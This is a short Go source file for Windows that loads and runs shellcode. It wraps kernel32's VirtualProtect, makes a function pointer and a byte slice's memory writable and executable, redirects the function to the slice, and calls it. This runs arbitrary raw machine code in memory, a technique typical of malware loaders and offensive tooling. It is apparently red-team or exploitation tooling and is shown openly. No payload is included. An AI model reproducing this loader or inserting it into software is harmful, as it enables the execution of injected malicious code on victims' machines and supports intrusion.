package pkg

import (
	"syscall"
	"unsafe"
)

var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func Run(sc []byte) {
	// Make a function ptr
	shellcodeFunc := func() {}

	// Change permissions on f function ptr
	var oldfpemissions uint32
	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&shellcodeFunc))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfpemissions)) {
		panic("Call to VirtualProtect failed!")
	}

	// Override function ptr
	**(**uintptr)(unsafe.Pointer(&shellcodeFunc)) = *(*uintptr)(unsafe.Pointer(&sc))

	// Change permissions on shellcode string data
	var oldshellcodepermissions uint32
	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodepermissions)) {
		panic("Call to VirtualProtect failed!")
	}

	shellcodeFunc()
}
